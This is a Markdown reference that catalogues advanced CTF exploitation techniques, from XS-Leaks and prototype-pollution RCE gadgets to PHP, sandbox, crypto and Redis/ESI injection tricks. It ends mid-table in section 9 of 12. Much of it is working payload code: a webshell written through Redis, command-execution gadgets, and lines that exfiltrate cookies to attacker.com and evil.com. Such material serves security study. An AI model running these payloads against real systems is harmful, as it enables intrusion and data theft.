# CTF Exotic Tricks — Advanced Exploitation Primitives Taxonomy

> Unusual but practically valuable exploitation primitives recurring in top-tier CTFs (Google CTF, PlaidCTF, HITCON CTF, DiceCTF, corCTF, SekaiCTF, DEF CON CTF) that do not fit neatly into conventional vulnerability classes. Each technique has demonstrated real-world applicability in bug bounties or penetration testing.
>
> **Scope exclusion**: This document intentionally avoids overlap with existing the-map topics (SQL/NoSQL/Command Injection, XSS, SSTI, XXE, SSRF, Deserialization, HTTP Smuggling, Race Condition, IDOR, File Upload, JWT, OAuth, SAML, CSRF, CORS, Unicode, URL Confusion, ZIP, Prototype Pollution, Cache Poisoning, WAF Bypass, Cookie, Open Redirect, Mass Assignment, etc.). Basic CTF staples (PHP type juggling 101, `.git` exposure, simple padding oracle) are omitted — only structurally interesting or non-obvious mutations are included.

---

## Taxonomy Axes

| Axis | Description |
|------|------------|
| **Axis 1 — Primitive Class** | Structural category the trick belongs to |
| **Axis 2 — What is Manipulated** | The specific invariant, assumption, or mechanism being violated |
| **Axis 3 — Exploitation Outcome** | Concrete impact: oracle construction, RCE, data exfiltration, sandbox escape |

---

## Table of Contents

1. [XS-Leaks — Cross-Site Information Inference](#1-xs-leaks--cross-site-information-inference)
2. [Prototype Pollution → RCE Gadget Chains](#2-prototype-pollution--rce-gadget-chains)
3. [PHP Internals Exploitation](#3-php-internals-exploitation)
4. [Advanced Sandbox / Jail Escape Primitives](#4-advanced-sandbox--jail-escape-primitives)
5. [Cryptographic Misuse Beyond Textbook](#5-cryptographic-misuse-beyond-textbook)
6. [Client-Side Isolation Bypass](#6-client-side-isolation-bypass)
7. [Parser Differential Edge Cases](#7-parser-differential-edge-cases)
8. [Injection into Exotic Processing Engines](#8-injection-into-exotic-processing-engines)
9. [Argument & Environment Injection](#9-argument--environment-injection)
10. [Advanced Race Condition Primitives](#10-advanced-race-condition-primitives)
11. [Protocol-Level Exploitation Primitives](#11-protocol-level-exploitation-primitives)
12. [Template Engine RCE Gadgets](#12-template-engine-rce-gadgets)

---

## 1. XS-Leaks — Cross-Site Information Inference

> A family of browser side-channel techniques that infer cross-origin state without violating SOP directly. Each leak exploits a browser behavior that produces a measurable signal depending on the target page's content or authentication state. These are the backbone of modern top-tier CTF web challenges.

### 1.1 Frame Counting Oracle (`window.length`)

**What is manipulated**: The number of frames/iframes in a cross-origin page is readable via `window.length`.

```javascript
const w = window.open('https://target.com/search?q=SECRET');
setTimeout(() => {
    // w.length reveals number of iframes in the response
    // search results page: 0 iframes = no results, 1+ = results found
    if (w.length > 0) { /* query matched */ }
    w.close();
}, 1000);
```

**Exploitation**: Binary search on secret values. If search results render differently (e.g., result cards in iframes), each query reveals whether the search term exists.

### 1.2 Error/Load Event Oracle

**What is manipulated**: `<script>`, `<img>`, `<link>` tags fire `onload` or `onerror` depending on the response status/content-type, leaking cross-origin state.

```javascript
// Detect if a user is logged in based on whether /api/profile returns 200 vs 401:
const img = new Image();
img.onload = () => { /* user is logged in (200 → valid image or non-image triggers onload for some elements) */ };
img.onerror = () => { /* user is not logged in (401/403) */ };
img.src = 'https://target.com/api/profile/avatar.png';

// Script tag status oracle (CSP can interfere):
const s = document.createElement('script');
s.src = 'https://target.com/api/data?q=test';
s.onload = () => { /* 200 response */ };
s.onerror = () => { /* non-200 or CSP block */ };
document.body.appendChild(s);
```

**Advanced variant — Content-Type confusion**: A `<script>` tag loading a JSON endpoint will fire `onerror` if the response is valid JSON with `application/json`, but `onload` if the server returns `text/javascript` — leaking content-type differences based on query parameters.

### 1.3 Timing-Based XS-Leaks via Performance API

**What is manipulated**: `performance.getEntriesByName()` reveals timing metadata for cross-origin resources loaded with `Timing-Allow-Origin`, but even without it, the *existence* of the entry and `duration` are measurable.

```javascript
// Detect redirect vs. direct response:
const url = 'https://target.com/admin';
fetch(url, { mode: 'no-cors', credentials: 'include' });
setTimeout(() => {
    const entries = performance.getEntriesByName(url);
    if (entries.length > 0) {
        // redirectCount, duration, transferSize (if TAO) reveal auth state
        if (entries[0].redirectCount > 0) { /* not logged in, redirected to login */ }
    }
}, 2000);
```

### 1.4 Connection Pool State Partitioning Side-Channel

**What is manipulated**: Browsers limit concurrent connections per host (typically 6 for HTTP/1.1). By saturating the pool and measuring when a probe request completes, you infer when a prior cross-origin request finished — revealing response time or size.

```javascript
// Saturate 5 of 6 connection slots:
const blockers = [];
for (let i = 0; i < 5; i++) {
    blockers.push(fetch(`https://target.com/slow?${i}`, { mode: 'no-cors' }));
}

// The 6th slot: target request whose timing we want to measure
const target = fetch('https://target.com/search?q=flag{a', { mode: 'no-cors' });

// 7th request: probe. Blocked until one of the 6 finishes.
const start = performance.now();
await fetch(`https://target.com/probe`, { mode: 'no-cors' });
const elapsed = performance.now() - start;
// elapsed reveals which request finished first → infer target's response time
```

**Key insight**: Post-2023, browsers implement connection pool partitioning by (top-level-site, frame-site). But same-site iframes still share the pool, and HTTP/2 multiplexing makes this subtler — you need to force HTTP/1.1 or use WebSocket connection exhaustion.

### 1.5 Cache Probing Oracle

**What is manipulated**: Whether a resource is cached or not is detectable via timing (cache hit = fast, miss = slow) or via `performance.getEntries()` `transferSize`.

```javascript
// Step 1: Evict cache for target resource
// Step 2: Navigate victim to a page that conditionally loads a resource
// Step 3: Probe whether the resource was cached

const probe = async (url) => {
    const start = performance.now();
    await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
    return performance.now() - start; // < 5ms = cached
};
```

**Variant — Cache partitioning bypass**: Modern browsers partition cache by top-level site. But `<link rel="preload">` and Service Workers can interact with partitioned caches in non-obvious ways.

### 1.6 `history.length` Probing

**What is manipulated**: `history.length` increments on same-origin navigations but is readable cross-origin, revealing whether a redirect chain occurred.

```javascript
const w = window.open('https://target.com/maybe-redirect');
setTimeout(() => {
    // If the page triggered client-side redirects, history.length increases
    // Reveals authentication state or conditional navigation logic
    console.log(w.history.length);
}, 2000);
```

### 1.7 Content-Disposition / Download Detection

**What is manipulated**: When a server responds with `Content-Disposition: attachment`, the browser initiates a download instead of navigation. This is detectable because `window.open()` for a download doesn't navigate away — the opened window remains at `about:blank`.

```javascript
const w = window.open('https://target.com/export?format=csv&id=1');
setTimeout(() => {
    try {
        w.origin; // throws if navigated cross-origin
        // If we reach here, window didn't navigate → download occurred → id=1 exists
    } catch {
        // navigated → no download → id=1 doesn't exist or error page
    }
}, 1000);
```

### 1.8 CSP Violation Event Oracle

**What is manipulated**: When CSP blocks a resource, a `SecurityPolicyViolationEvent` fires. If you control the CSP (e.g., via meta injection or a CSP-bearing iframe), you can detect whether cross-origin resources match specific patterns.

```javascript
document.addEventListener('securitypolicyviolation', (e) => {
    // e.blockedURI reveals the URL that was blocked
    // e.effectiveDirective reveals which directive triggered
    // Useful for detecting whether a page loaded specific subresources
});
```

---

## 2. Prototype Pollution → RCE Gadget Chains

> Prototype pollution itself is covered in existing taxonomy. This section covers the **sink gadgets** — the specific code patterns in popular libraries/frameworks that convert prototype pollution into RCE or significant impact. These chains are the difference between a theoretical vulnerability and a critical exploit.

### 2.1 EJS `opts.outputFunctionName` → RCE

**Gadget**: EJS template engine reads `opts.outputFunctionName` from the options object. If polluted, this string is injected directly into generated code without sanitization.

```javascript
// Pollution:
Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("id");x';

// When EJS renders any template:
ejs.render('<%= "hello" %>', {});
// Generated code includes: var x;process.mainModule.require("child_process").execSync("id");x = '';
// → RCE
```

**Variants**: `opts.escapeFunction`, `opts.localsName`, `opts.destructuredLocals` are also injectable in certain EJS versions.

### 2.2 Pug (Jade) AST Injection → RCE

**Gadget**: Pug's AST compiler checks `block.type` to determine how to compile nodes. Polluting `block.type` to `"Code"` causes the block's value to be treated as executable code.

```javascript
Object.prototype.block = {
    "type": "Text",
    "val": "process.mainModule.require('child_process').execSync('id')"
};
// Pug compilation triggers code execution
```

### 2.3 Handlebars `lookupProperty` / `allowProtoPropertiesByDefault` → RCE

**Gadget**: Handlebars 4.x added prototype access restrictions, but polluting `allowProtoPropertiesByDefault` or `allowProtoMethodsByDefault` re-enables dangerous property access.

```javascript
Object.prototype.allowProtoPropertiesByDefault = true;
Object.prototype.allowProtoMethodsByDefault = true;

// Now templates can access __proto__, constructor, etc.
// Template: {{#with "s" as |string|}}{{#with (string.sub.apply 0 "constructor")}}{{this.call (this "return process.mainModule.require('child_process').execSync('id')")}}{{/with}}{{/with}}
```

### 2.4 `child_process.spawn` / `child_process.fork` Env Pollution → RCE

**Gadget**: When `child_process.spawn()` or `fork()` is called without explicitly setting `env`, it inherits `process.env`. If prototype pollution can set `env` properties on the options object:

```javascript
Object.prototype.env = {
    NODE_OPTIONS: '--require /proc/self/environ',
    // or
    NODE_DEBUG: 'child_process'
};
Object.prototype.shell = true;
Object.prototype.argv0 = 'id';

// Any subsequent child_process.spawn('node', [...]) uses polluted env
```

**More direct chain**:
```javascript
// If .shell is pollutable and the command is an array:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.env = { 'NODE_OPTIONS': '--require=/tmp/evil.js' };
```

### 2.5 `process.env` via Prototype Pollution → `HTTP_PROXY` MITM

**Gadget**: `process.env` in Node.js is a plain object. Libraries like `axios`, `got`, `node-fetch` read `process.env.HTTP_PROXY`. If prototype pollution reaches `process.env`:

```javascript
Object.prototype.HTTP_PROXY = 'http://attacker.com:8080';
// All outbound HTTP requests from the server now proxy through attacker
// → credential interception, API key theft
```

### 2.6 `Object.prototype.constructor.prototype` → Webpack Module Override

**Gadget**: Webpack's module system uses objects with `exports` properties. Polluting the prototype chain can inject modules.

```javascript
Object.prototype.exports = { malicious: true };
// Webpack require() may resolve polluted exports for missing modules
```

---

## 3. PHP Internals Exploitation

> Beyond basic type juggling — advanced PHP-specific primitives that exploit the language runtime, extension internals, and operational quirks.

### 3.1 `iconv()` Buffer Overflow → RCE (CVE-2024-2961)

**What is manipulated**: glibc's `iconv()` has a buffer overflow when converting to `ISO-2022-CN-EXT`. PHP's `iconv()` function (and all filter chains using `convert.iconv`) are affected.

```
php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=data:,AAAA...
```

**Exploitation chain**: PHP filter chain with crafted iconv conversion → heap buffer overflow → arbitrary write → RCE. This converts **any** `file_get_contents()` or `include()` with user-controlled input into RCE, even without `allow_url_include`.

**Impact**: Affects all PHP versions on glibc-based systems (nearly all Linux). Discovered by Charles Fol (LEXFO/Ambionics), presented at OffensiveCon 2024. Patched in glibc 2.40.

**Key insight**: Unlike PHP filter chain RCE (which generates PHP code), this achieves native code execution via memory corruption — bypassing `disable_functions` entirely.

### 3.2 PHP Session Upload Progress Race → LFI to RCE

**What is manipulated**: When `session.upload_progress.enabled = On` (default), PHP creates a temporary session file containing user-controlled data during file upload, before the upload completes.

```
# Session file created at: /var/lib/php/sessions/sess_[PHPSESSID]
# Content includes the upload progress data with user-controlled filename

POST /upload.php HTTP/1.1
Cookie: PHPSESSID=attacker_session

Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
<?php system($_GET['c']); ?>
```

**Race window**: The session file exists briefly during upload. A concurrent LFI request can include it:

```
GET /vuln.php?file=/var/lib/php/sessions/sess_attacker_session&c=id
```

**Key insight**: Works even when file upload itself is disabled — the session progress mechanism creates the file independently. Combine with `PHP_SESSION_UPLOAD_PROGRESS` parameter to control content.

### 3.3 PHP Temporary File Name Prediction

**What is manipulated**: PHP's `$_FILES` creates temp files at `/tmp/php[a-zA-Z0-9]{6}`. The name is generated by `mkstemp()`, which uses a sequential counter in some implementations.

```
File pattern: /tmp/php[A-Za-z0-9]{6}
Total keyspace: 62^6 ≈ 56 billion — too large to brute force

But: On older systems, mkstemp uses PID + timestamp, reducing keyspace dramatically.
On modern Linux with systemd: /tmp is often per-service (PrivateTmp=true).
```

**Practical approach**: Combine with phpinfo() page to leak the temp filename, then race to include it before cleanup.

### 3.4 `preg_replace()` with `/e` Modifier → Code Eval (PHP < 7)

**What is manipulated**: The `/e` modifier causes `preg_replace()` to evaluate the replacement string as PHP code.

```php
// Vulnerable pattern (PHP < 7 only):
preg_replace('/.*/e', 'system("$0")', $user_input);

// With user control over the pattern:
preg_replace($user_pattern, $user_replacement, $data);
// Inject: pattern = "/x/e", replacement = "system('id')"
```

**Note**: Removed in PHP 7.0, but still found in legacy codebases. `preg_replace_callback()` is the safe replacement.

### 3.5 `assert()` as `eval()` Alternative (PHP < 8)

**What is manipulated**: In PHP 5.x-7.x, `assert()` accepts string arguments and evaluates them as PHP code.

```php
// If assert() is reachable with user input:
assert("strpos('$user_input', 'admin') === 0");
// Inject: user_input = x]') === 0 || system('id') || strpos('
// → assert("strpos('x]') === 0 || system('id') || strpos('', 'admin') === 0");
```

**Deprecated in PHP 7.2, removed as code eval in PHP 8.0**. Still exploitable in legacy systems.

### 3.6 `extract()` / `parse_str()` Variable Overwrite

**What is manipulated**: `extract()` imports array keys as local variables. `parse_str()` (without second argument, PHP < 8) sets variables in the current scope.

```php
// Variable overwrite → auth bypass:
$is_admin = false;
extract($_GET);  // GET: ?is_admin=1 → $is_admin = "1" (truthy)

// parse_str without second arg (PHP < 8):
parse_str($query_string);  // Creates variables in current scope
```

### 3.7 PHP-FPM Direct Communication (FastCGI Protocol Injection)

**What is manipulated**: If an SSRF can reach the PHP-FPM Unix socket or TCP port (default: 9000), raw FastCGI records can set arbitrary PHP configuration values per-request.

```python
# FastCGI record to execute arbitrary PHP:
# Set PHP_VALUE: auto_prepend_file = /etc/passwd
# Set PHP_ADMIN_VALUE: allow_url_include = On
# Set SCRIPT_FILENAME: /var/www/html/index.php
```

**Tool**: `gopherus` generates Gopher payloads for PHP-FPM exploitation via SSRF.

**Key insight**: Even with `disable_functions`, FastCGI `PHP_VALUE` can override `open_basedir`, `auto_prepend_file`, and other critical settings.

---

## 4. Advanced Sandbox / Jail Escape Primitives

> Beyond basic `__subclasses__()` traversal — advanced techniques from jailCTF 2025, KalmarCTF 2025, SECCON 2024, and PlaidCTF that push language runtime boundaries.

### 4.1 Pyjail: `gc.get_referrers()` / `gc.get_objects()` Memory Archaeology

**What is manipulated**: The garbage collector exposes references to all tracked Python objects, including those in "deleted" or "private" scopes.

```python
import gc
# Find all string objects containing 'FLAG':
[obj for obj in gc.get_objects() if isinstance(obj, str) and 'FLAG' in obj]

# Find function objects and inspect their globals:
funcs = [obj for obj in gc.get_objects() if callable(obj) and hasattr(obj, '__globals__')]
for f in funcs:
    if 'secret' in f.__globals__:
        print(f.__globals__['secret'])
```

**KalmarCTF 2025**: Used `gc` module with `numpy.genfromtxt` for file read in a restricted environment.

### 4.2 Pyjail: `help()` as Universal Import Primitive

**What is manipulated**: Python's `help()` function internally imports modules to display documentation. In some environments where `import` is blocked, `help()` still works.

```python
# SECCON CTF 2024 Quals:
help()  # enters interactive help
# type: modules  → lists all importable modules
# type: os  → imports os module to show its help
# After help() exits, os is now in sys.modules and accessible
```

### 4.3 Pyjail: `__init_subclass__` / `__set_name__` Hooks

**What is manipulated**: Python metaclass hooks execute arbitrary code when classes are defined, without explicit `eval`/`exec`.

```python
class X:
    def __init_subclass__(cls, **kwargs):
        __import__('os').system('id')

class Y(X):  # triggers __init_subclass__ → RCE
    pass
```

```python
class Descriptor:
    def __set_name__(self, owner, name):
        __import__('os').system('id')

class X:
    attr = Descriptor()  # triggers __set_name__ → RCE
```

### 4.4 Pyjail: Walrus Operator + Exception Handler Scope Leaking

```python
# Python 3.8+ walrus operator for scope leaking:
[y := __import__('os') for x in [1]]
y.system('id')  # y is now accessible in the outer scope

# Exception variable scope abuse:
try:
    1/0
except Exception as e:
    e.__class__.__base__.__subclasses__()  # access from exception handler scope
```

### 4.5 Pyjail: Code Object Surgery

**What is manipulated**: Python code objects (`types.CodeType`) can be constructed with arbitrary bytecode, bypassing AST-level restrictions.

```python
import types

# Create a code object that calls os.system("id"):
# 1. Get a reference to os.system via __subclasses__
# 2. Construct bytecode that calls it
# 3. Wrap in a function and call

co = types.CodeType(
    0, 0, 0, 0, 0, 0,
    bytes([100, 0, 83, 0]),  # LOAD_CONST 0, RETURN_VALUE
    (None,), (), (), '', '', 0, b'', (), ()
)
```

**jailCTF 2025**: Featured challenges requiring bytecode-level manipulation to escape auditing of the AST.

### 4.6 Node.js `vm` Escape via `WeakRef` / `FinalizationRegistry`

**What is manipulated**: `WeakRef` and `FinalizationRegistry` callbacks execute in the host realm, not the sandbox realm, providing an escape path.

```javascript
// Inside vm sandbox:
const fr = new FinalizationRegistry((ref) => {
    // This callback runs in host context
    // ref.constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
});
```

### 4.7 Node.js `vm` Escape via `import()` Dynamic Import

```javascript
// vm sandbox context:
import('child_process').then(cp => cp.execSync('id'));
// import() resolves in the host module system, not the sandbox
```

**Mitigation**: Requires `--experimental-vm-modules` flag or specific ESM configuration.

---

## 5. Cryptographic Misuse Beyond Textbook

> Beyond basic padding oracle and hash extension — advanced cryptographic misuse patterns from PlaidCTF, HITCON Crypto, and real-world applications.

### 5.1 ECDSA Nonce Reuse → Private Key Recovery

**What is manipulated**: If the same nonce `k` is used for two different ECDSA signatures, the private key can be algebraically recovered.

```
Given signatures (r, s1) and (r, s2) for messages m1 and m2:
k = (m1 - m2) / (s1 - s2) mod n
private_key = (s1 * k - m1) / r mod n
```

**Practical sources of nonce reuse**:
- `k = HMAC(private_key, message)` but message is constant (e.g., health check signing)
- Poor entropy source during key generation (VM snapshot, container restart)
- Sony PS3 ECDSA key extraction (used static `k = 4`)

**Partial nonce leak (LadderLeak, Minerva)**: Even leaking a few bits of the nonce per signature enables lattice-based private key recovery with enough signatures.

### 5.2 AES-GCM Nonce Reuse → Authentication Key Recovery + Forgery

**What is manipulated**: GCM mode uses the same nonce to derive both the encryption keystream and the GHASH authentication key. Reusing a nonce reveals the authentication key `H`.

```
Given two ciphertexts C1, C2 encrypted with the same (key, nonce):
C1 ⊕ C2 = P1 ⊕ P2  (keystream cancels)

And authentication tags T1, T2:
T1 ⊕ T2 = GHASH_H(C1 || len1) ⊕ GHASH_H(C2 || len2)
→ Solve polynomial equation over GF(2^128) to recover H
→ Forge valid tags for arbitrary ciphertexts
```

**Real-world**: TLS 1.2 with AES-GCM under nonce mismanagement, JWT libraries using AES-GCM with static IVs.

### 5.3 Bleichenbacher's Attack on RSA PKCS#1 v1.5

**What is manipulated**: The server reveals whether RSA-decrypted ciphertext has valid PKCS#1 v1.5 padding (starts with `0x00 0x02`). This 1-bit oracle enables full plaintext recovery.

```
For each guess:
  c' = c * s^e mod n  (multiply ciphertext by s^e for chosen s)
  Send c' to server
  If server says "valid padding" → s is in a valid range → narrow down plaintext interval
```

**Complexity**: ~1 million queries for a 2048-bit RSA key.

**Modern variants**: ROBOT attack (2017) found Bleichenbacher oracles in major TLS implementations (F5, Citrix, Cisco, Palo Alto). DROWN attack exploited SSLv2 Bleichenbacher oracle to decrypt TLS 1.2 sessions.

### 5.4 RSA Partial Key Exposure (Coppersmith's Method)

**What is manipulated**: If partial bits of an RSA private key are known (e.g., low bits of `d` leaked via side-channel), the full key can be reconstructed using lattice reduction.

```python
# Sage/SageMath:
# Given n, e, and partial d (e.g., lower 512 bits of a 2048-bit key):
d_low = 0x...  # known lower bits
# Construct polynomial and find small roots using Coppersmith
```

**PlaidCTF 2025 (Tales from the Crypt)**: Required recovering a corrupted RSA private key from a pcap containing TLS traffic, using partial key exposure techniques to reconstruct the key and decrypt sessions.

### 5.5 CBC Padding Oracle as Encryption Oracle

**What is usually missed**: A padding oracle not only **decrypts** arbitrary ciphertext but also **encrypts** arbitrary plaintext. By chaining intermediate values backward, you construct valid ciphertext for any desired plaintext.

```
Standard padding oracle: Ciphertext → Plaintext (decryption)
Reverse operation: For desired plaintext P:
  Choose random final block C_n
  Use oracle to find intermediate value I_n for C_n
  Compute C_{n-1} = I_n ⊕ P_n
  Repeat backward through all blocks
  → Valid ciphertext for arbitrary plaintext, without knowing the key
```

**Impact escalation**: This turns a **read** primitive (decryption) into a **write** primitive (forging valid encrypted tokens). If the application uses CBC-encrypted cookies for authorization, you can forge admin tokens.

### 5.6 PRNG State Recovery from Partial / Transformed Output

**Beyond basic 624-output recovery** — real-world CTF scenarios where PRNG output is partially observable or transformed:

```python
# Google CTF 2025 (Postviewer v5):
# Random values encoded as base36 strings → only 5-6 chars visible
# Approach:
# 1. Recover base36-encoded values from leaked messages
# 2. Convert back to numeric ranges (base36 → integer)
# 3. Each value constrains a few bits of MT state
# 4. Use Z3 symbolic solver with bit constraints
# 5. Recover full MT state → predict future values (salt, nonces)

from z3 import *
# symbolic_mersenne_cracker: feed partial outputs as constraints
```

**Truncated output recovery**: When only lower N bits of each MT output are visible, the `symbolic_mersenne_cracker` Z3 approach recovers full state with ~700+ partial observations.

---

## 6. Client-Side Isolation Bypass

> Advanced browser mechanism abuse for cross-origin data exfiltration, beyond basic postMessage/cookie tricks.

### 6.1 `window.name` Cross-Origin Data Channel

**What is manipulated**: `window.name` persists across cross-origin navigations. A page at origin A can set `window.name`, navigate to origin B, and B reads the same `window.name`.

```javascript
// On target.com (via XSS or reflected injection):
window.name = document.cookie;  // or any sensitive data
window.location = 'https://attacker.com/collect';

// On attacker.com/collect:
document.title = window.name;  // contains target's cookies
```

**Key insight**: Unlike `document.cookie` (same-origin) or `localStorage` (same-origin), `window.name` has no origin restriction on read/write. It survives cross-origin navigation.

### 6.2 DOM Clobbering → React/Angular Router Hijack

**What is manipulated**: React Router accesses `document.defaultView.history` for navigation. DOM clobbering `defaultView` breaks the reference chain.

```html
<!-- DiceCTF 2024: -->
<!-- Clobber document.defaultView to inject controlled history object -->
<iframe name="defaultView" src="data:text/html,<script>...</script>"></iframe>

<!-- Also: react-router reads HTMLAnchorElement.href for route resolution -->
<!-- Clobber with <a> tags to redirect routing -->
```

**Angular variant**: Angular's `DomSanitizer` checks `document.createElement` — clobbering `document.createElement` affects sanitization logic.

### 6.3 CSS `:has()` Selector for Arbitrary DOM Content Exfiltration

**What is manipulated**: The CSS `:has()` selector (supported since 2023) enables parent selection based on child content, creating new exfiltration channels.

```css
/* Exfiltrate text content via sibling/child relationship: */
/* If an element with id="secret" has text starting with 'a': */
body:has(#secret[data-value^="a"]) { background: url(https://evil.com/?a); }

/* Exfiltrate element existence: */
body:has(div.admin-panel) { background: url(https://evil.com/?is_admin); }

/* Chained with @import for recursive extraction: */
@import url(https://evil.com/next-css?known=abc);
/* Server dynamically generates CSS that probes the next character */
```

**Key insight**: `:has()` is a relational pseudo-class that enables CSS-only data exfiltration without `<input>` elements — it can detect the presence/absence of any DOM structure.

### 6.4 Client-Side Desync (Browser-Powered Smuggling)

**What is manipulated**: The browser itself sends a request that causes desync between the browser's HTTP stack and the server's, allowing the attacker to poison subsequent same-connection requests.

```javascript
// Stale CL-based CSD:
fetch('https://target.com/endpoint', {
    method: 'POST',
    body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
    headers: { 'Content-Type': 'text/plain' },
    mode: 'cors',
    credentials: 'include'
});
// Browser thinks it sent one request
// Server processes two → second request carries victim's cookies
```

**James Kettle (PortSwigger)**: Introduced CSD at Black Hat USA 2022. The browser acts as the desync front-end, no proxy required.

### 6.5 Speculation Rules API / Prefetch Side-Channel

**What is manipulated**: Chrome's Speculation Rules API (`<script type="speculationrules">`) prefetches pages in the background. The prefetch status is detectable via Performance API.

```html
<script type="speculationrules">
{
  "prefetch": [{ "urls": ["https://target.com/search?q=secret"] }]
}
</script>
<!-- If the prefetched response differs based on query (e.g., 200 vs 404),
     the prefetch timing/status reveals information -->
```

---

## 7. Parser Differential Edge Cases

> Subtle inconsistencies between parsers that create security-relevant discrepancies. Focus on non-obvious cases not covered in HTTP smuggling or URL confusion taxonomies.

### 7.1 YAML 1.1 vs 1.2 Boolean Parsing

**What is manipulated**: YAML 1.1 treats `yes`, `no`, `on`, `off`, `y`, `n` as booleans. YAML 1.2 does not.

```yaml
# YAML 1.1 (Ruby, Python PyYAML):
admin: no      # parsed as: admin: false
country: no    # parsed as: country: false (not the string "no"!)

# YAML 1.2 (Go, Rust, newer parsers):
admin: no      # parsed as: admin: "no" (string)
```

**Exploitation**: Configuration injection where `no` is intended as a country code ("Norway") but parsed as boolean `false`, or vice versa. Combined with framework-specific YAML loading, this creates auth bypass or configuration corruption.

### 7.2 JSON Number Precision Loss (IEEE 754)

**What is manipulated**: JSON numbers are parsed as IEEE 754 double-precision floats, which have 53 bits of mantissa. IDs > 2^53 lose precision.

```javascript
// Server sends: {"id": 9007199254740993}
// JavaScript parses: 9007199254740992 (precision lost!)
// This creates ID collision/confusion

// Exploitation: Two different objects with IDs near 2^53 may
// resolve to the same numeric value in the client
```

**Practical impact**: Twitter famously had to switch to string IDs because tweet IDs exceeded 2^53. Applications using numeric IDs near this boundary are vulnerable to ID confusion.

### 7.3 JSON5 / JSONC / JSON Superset Differential

**What is manipulated**: Some backends accept JSON5 or JSONC (JSON with comments) while validators check strict JSON.

```
// Passes JSON validation (ignored as comment by JSON5 parser):
{
  "role": "user" // ,"role": "admin"
}

// JSON5 trailing comma:
{"a": 1, "b": 2,}  // Valid JSON5, invalid JSON

// JSON5 single quotes:
{'role': 'admin'}  // Valid JSON5, invalid JSON
```

### 7.4 Multipart Boundary Ambiguity

**What is manipulated**: The multipart boundary delimiter is defined in the Content-Type header, but different parsers handle edge cases differently (spaces, quotes, semicolons in boundary).

```
Content-Type: multipart/form-data; boundary="abc;def"
```

**Parser A** (WAF): boundary = `abc` (stops at semicolon)
**Parser B** (backend): boundary = `abc;def` (respects quotes)
→ WAF sees different field boundaries than the backend → injection.

### 7.5 nginx `merge_slashes` + Backend Path Differential

**What is manipulated**: nginx with `merge_slashes on` (default) normalizes `//` to `/`, but many backends preserve double slashes.

```
Request: GET //admin/panel
nginx (proxy): → /admin/panel (merged) → matches location /admin/ → applies auth
Backend: → //admin/panel → may not match /admin/ prefix → bypasses auth

Request: GET /static/..%2f/admin/panel
nginx: static file, no auth needed
Backend (path normalization): /admin/panel → sensitive endpoint
```

---

## 8. Injection into Exotic Processing Engines

> Server-side injection vectors targeting non-standard processing engines.

### 8.1 Edge Side Include (ESI) Injection — Advanced Chains

Beyond basic `<esi:include>`:

```xml
<!-- ESI + XSLT (Varnish with XSLT support): -->
<esi:include src="/page" stylesheet="http://attacker.com/evil.xslt" />
<!-- Applies attacker-controlled XSLT transformation to the included content -->

<!-- ESI variable access (Akamai): -->
<esi:assign name="cookie_val" value="$(HTTP_COOKIE{session})"/>
<esi:include src="http://attacker.com/steal?s=$(cookie_val)"/>
<!-- Exfiltrates session cookie via ESI variable expansion -->

<!-- ESI try/except for blind detection: -->
<esi:try>
  <esi:attempt><esi:include src="http://internal.svc:8080/"/></esi:attempt>
  <esi:except><!-- service not reachable --></esi:except>
</esi:try>
```

**Detection trick**: Inject `<esi:include src="http://burpcollaborator.net"/>` in any reflected input. If a callback arrives, ESI processing is active.

### 8.2 XSLT Injection — Cross-Processor RCE Gadgets

| Processor | RCE Gadget | Payload |
|-----------|-----------|---------|
| Xalan-J | `java.lang.Runtime` | `rt:exec($rtObj, 'id')` via extension namespace |
| Saxon | `saxon:evaluate()` | Dynamic XPath with code execution |
| libxslt (PHP) | `php:function()` | `php:function('system', 'id')` |
| .NET `XslCompiledTransform` | `msxsl:script` | Inline C# code in XSLT |
| Python `lxml` | `exsl:document()` | Write arbitrary files |

### 8.3 HTML-to-PDF SSRF — Engine-Specific Bypasses

| Engine | Bypass | Technique |
|--------|--------|-----------|
| wkhtmltopdf | `--disable-local-file-access` bypass | `<meta http-equiv="refresh">` to `file://` before flag is set |
| Puppeteer | `--no-sandbox` + `file://` | Chrome's `file://` access when launched without sandbox |
| WeasyPrint | CSS `@page` exploitation | `@page { background: url(http://169.254.169.254/) }` — CSS properties trigger HTTP requests |
| mPDF | SSRF via `<annotation>` | `<annotation file="/etc/passwd" content="" icon="Graph" title="x" pos-x="0" />` |
| Prince XML | `prince-pdf-script` header | Inline JavaScript execution in PDF context |

### 8.4 LaTeX Injection — `\write18` Alternatives

When `--shell-escape` is disabled:
```latex
% LuaTeX (often installed alongside pdfTeX):
\directlua{os.execute("id")}

% Read files character by character (bypass line-length limits):
\catcode`\_=12  % change catcode to read underscores
\newread\f \openin\f=/etc/passwd
\loop \unless\ifeof\f \read\f to\l \l \repeat

% Exfiltrate via DNS (no outbound HTTP needed):
\newread\f \openin\f=/etc/hostname
\read\f to\hostname
% Use \hostname in a URL that triggers DNS lookup
```

### 8.5 Redis Protocol Injection via SSRF (RESP Protocol)

**What is manipulated**: When an SSRF can reach Redis (port 6379), the RESP protocol can be injected via HTTP redirects or Gopher URLs because Redis accepts inline commands.

```
# Via Gopher:
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT

# Translates to:
SET shell "<?php system($_GET['c']);?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SAVE
QUIT
```

**Advanced — Redis MODULE LOAD for native RCE**: If Redis 4.0+ allows module loading, upload a `.so` via `SET` + `CONFIG SET dir/dbfilename` + `MODULE LOAD`.

**Slave-of attack**: Force Redis to replicate from attacker-controlled server → inject `.so` module via replication protocol.

---

## 9. Argument & Environment Injection

> Combined taxonomy of CLI argument injection and environment variable manipulation for RCE.

### 9.1 Flag Injection Through Safe-Looking APIs

When `execFile` (not `exec`) is used and command separators are blocked:

| Program | Flag | Effect |
|---------|------|--------|
| `git clone` | `--upload-pack="id>/tmp/out"` | Arbitrary command during clone |
